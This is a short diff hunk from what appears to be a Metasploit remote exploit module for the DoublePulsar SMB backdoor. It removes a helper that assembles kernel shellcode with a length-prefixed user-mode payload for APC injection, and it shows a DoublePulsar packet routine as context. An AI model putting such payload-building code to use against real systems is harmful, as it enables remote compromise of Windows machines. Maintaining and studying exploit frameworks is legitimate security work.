@@ -324,17 +324,6 @@ class MetasploitModule < Msf::Exploit::Remote
     pkt.to_s
   end
 
-  # ring3 = user mode encoded payload
-  # proc_name = process to inject APC into
-  def make_kernel_user_payload(ring3)
-    sc = make_kernel_shellcode()
-
-    sc << [ring3.length].pack('S<')
-    sc << ring3
-
-    sc
-  end
-
   def do_exec_doublepulsar_pkt(opcode, body, total_payload_size, chunk, offset)
     # make doublepulsar knock
     pkt = make_exec_trans2_doublepulsar(opcode, body, total_payload_size, chunk, offset)
